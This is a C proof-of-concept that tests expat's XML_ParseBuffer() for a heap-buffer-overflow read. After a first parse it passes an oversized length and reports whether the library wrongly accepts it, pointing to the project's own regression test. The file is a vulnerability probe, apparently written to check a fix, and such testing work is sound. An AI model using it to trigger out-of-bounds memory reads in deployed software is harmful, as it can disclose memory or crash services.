/* Proof-of-concept for a heap-buffer-overflow read in XML_ParseBuffer().
 *
 * XML_ParseBuffer() is supposed to reject a `len` argument that exceeds the
 * unoccupied capacity of the parser's internal input buffer (the space
 * between m_bufferEnd and m_bufferLim, i.e. what is actually still backed
 * by the current heap allocation). This probe first lets the parser
 * consume a sizeable, well-formed prefix (so m_bufferEnd moves well past
 * m_buffer), then calls XML_ParseBuffer() again claiming a `len` that is
 * larger than the buffer's *remaining* capacity but no larger than its
 * *total* capacity. A conforming implementation must reject this call (see
 * the project's own test_parse_buffer_exceeds_buffer regression test); if
 * it doesn't, the parser advances m_bufferEnd past the end of the actual
 * heap allocation, and the tokenizer reads out of bounds while scanning up
 * to that bogus new end pointer.
 *
 * The whole 8192-byte buffer is pre-filled with well-formed, in-contract
 * XML content (an open root element, padding whitespace, and the matching
 * close tag) so there is nothing for the tokenizer to choke on anywhere
 * inside the real allocation; the only way this probe can fail is by
 * reading past the end of it.
 */
#include <expat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void) {
  XML_Parser parser = XML_ParserCreate(NULL);
  if (! parser) {
    fprintf(stderr, "XML_ParserCreate failed\n");
    return 1;
  }

  /* XML_GetBuffer grows the buffer by doubling from a 1024-byte base until
   * it's at least as large as requested; requesting 6000 bytes yields a
   * 8192-byte allocation (1024 -> 2048 -> 4096 -> 8192). */
  const int requestLen = 6000;
  const size_t bufferSize = 8192;
  char *buf = (char *)XML_GetBuffer(parser, requestLen);
  if (! buf) {
    fprintf(stderr, "XML_GetBuffer failed\n");
    return 1;
  }

  /* Fill the *entire* allocation with well-formed content: an open root
   * element, spaces as padding, and the matching close tag right at the
   * very end. */
  const char head[] = "<r>";
  const char tail[] = "</r>";
  memcpy(buf, head, strlen(head));
  memset(buf + strlen(head), ' ', bufferSize - strlen(head) - strlen(tail));
  memcpy(buf + bufferSize - strlen(tail), tail, strlen(tail));

  /* Tell the parser only about the first half: an open root element
   * followed by plain padding (no close tag yet), which is simply
   * "need more data", not an error. */
  const int firstLen = (int)(bufferSize / 2);
  if (XML_ParseBuffer(parser, firstLen, XML_FALSE) != XML_STATUS_OK) {
    fprintf(stderr, "first XML_ParseBuffer failed: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
    return 1;
  }

  /* True remaining capacity is now bufferSize - firstLen. Claim a second
   * chunk bigger than that, but still within the buffer's *total* size. An
   * in-contract caller would never lie about how much data it wrote, but
   * XML_ParseBuffer()'s own documented job is to detect and reject exactly
   * this mismatch rather than trust the caller blindly. */
  const int secondLen = (int)bufferSize - 192;
  enum XML_Status status = XML_ParseBuffer(parser, secondLen, XML_TRUE);

  if (status == XML_STATUS_ERROR
      && XML_GetErrorCode(parser) == XML_ERROR_INVALID_ARGUMENT) {
    printf("correctly rejected oversized len; not vulnerable\n");
    XML_ParserFree(parser);
    return 0;
  }

  /* If we get here without a sanitizer abort, the implementation accepted
   * an oversized len and the tokenizer has already read past the end of
   * the heap allocation while processing it. */
  printf("accepted oversized len (status=%d); memory already read out of "
         "bounds if no sanitizer is attached\n",
         (int)status);
  XML_ParserFree(parser);
  return 0;
}
